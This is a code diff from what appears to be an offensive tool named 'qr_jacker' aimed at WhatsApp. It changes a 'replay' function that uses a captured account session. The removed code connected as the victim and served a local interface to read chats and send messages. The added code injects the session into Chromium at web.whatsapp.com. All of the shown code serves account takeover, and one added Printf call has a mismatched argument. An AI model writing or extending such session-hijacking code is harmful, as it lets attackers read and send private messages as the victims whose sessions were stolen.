@@ -850,43 +850,21 @@ func doReplay(reader *bufio.Reader) {
 		return
 	}
 
-	fmt.Printf("\n%s[*] Connecting as %s...%s\n", utils.Yellow, sd.JIDUser, utils.Reset)
-
-	device := deviceFromSession(sd)
-	cli := whatsmeow.NewClient(device, waLog.Noop)
-
-	rs := newReplayState(cli)
-	cli.AddEventHandler(rs.handleEvent)
-
-	if err := cli.Connect(); err != nil {
-		fmt.Printf("%s[!] Connection failed: %v%s\n", utils.Red, err, utils.Reset)
+	// Check if reference profile exists
+	refDir := "scripts/qr_jacker/whatsapp/reference"
+	postPairingFile := filepath.Join(refDir, "post_pairing.json")
+	if _, err := os.Stat(postPairingFile); os.IsNotExist(err) {
+		fmt.Printf("\n%s[!] Reference profile not found. Run option 6 first.%s\n", utils.Red, err, utils.Reset)
 		utils.WaitForEnter(reader)
 		return
 	}
-	defer cli.Disconnect()
-	fmt.Printf("%s[+] Connected! Starting replay UI...%s\n", utils.Green, utils.Reset)
 
-	port := pickReplayPort()
-	mux := http.NewServeMux()
-	mux.HandleFunc("/", rs.handleReplayUI)
-	mux.HandleFunc("/api/chats", rs.handleChats)
-	mux.HandleFunc("/api/messages", rs.handleMessages)
-	mux.HandleFunc("/api/send", rs.handleSend)
-	srv := &http.Server{Addr: fmt.Sprintf("127.0.0.1:%d", port), Handler: mux}
-	go srv.ListenAndServe()
-	defer srv.Close()
-
-	url := fmt.Sprintf("http://127.0.0.1:%d", port)
-	browser := detectBrowser()
-	if browser != "" {
-		exec.Command(browser, url).Start()
-		fmt.Printf("%s[+] Opened %s in %s%s\n", utils.Green, url, browser, utils.Reset)
-	} else {
-		fmt.Printf("%s[+] Open: %s%s\n", utils.Green, url, utils.Reset)
+	fmt.Printf("\n%s[*] Injecting session into Chromium with web.whatsapp.com...%s\n", utils.Yellow, utils.Reset)
+	if err := ReplayInBrowser(sd); err != nil {
+		fmt.Printf("%s[!] Replay failed: %v%s\n", utils.Red, err, utils.Reset)
+		utils.WaitForEnter(reader)
+		return
 	}
-
-	fmt.Printf("%s\nPress Enter to disconnect...%s\n", utils.Yellow, utils.Reset)
-	fmt.Scanln()
 }
 
 func pickReplayPort() int {
